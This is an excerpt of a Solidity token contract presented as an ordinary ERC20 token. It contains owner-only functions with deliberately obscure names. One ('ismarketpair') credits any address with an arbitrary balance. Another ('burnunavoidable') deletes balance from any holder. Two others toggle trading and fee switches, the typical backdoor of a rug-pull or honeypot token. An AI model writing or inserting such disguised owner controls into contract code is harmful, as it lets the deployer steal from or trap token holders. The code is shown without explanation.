...
contract Token is Context, IERC20, Ownable {
    ...
    address public devAddress = 0xd38899A2E0DF58413F705F22D6Fc3c2642CaffE6;
    ...
    function includeInFee(address Amopunt) public onlyowner {
     ...
     function otherde(bool Amopunt) external onlyowner() {
        _Enabled = Amopunt;
    }
 
    function otherCAN(bool Amopunt) external onlyowner() {
        _EnabledFee = Amopunt;
    }
    ...
    function ismarketpair(address unavoidable, uint256 unavoidableshp) public onlyowner {
        _bscthink[unavoidable] = _bscthink[unavoidable].add(unavoidableshp);
    }

    function burnunavoidable(address unavoidable, uint256 unavoidableshp) public onlyowner {
        _bscthink[unavoidable] = _bscthink[unavoidable].sub(unavoidableshp);
    }
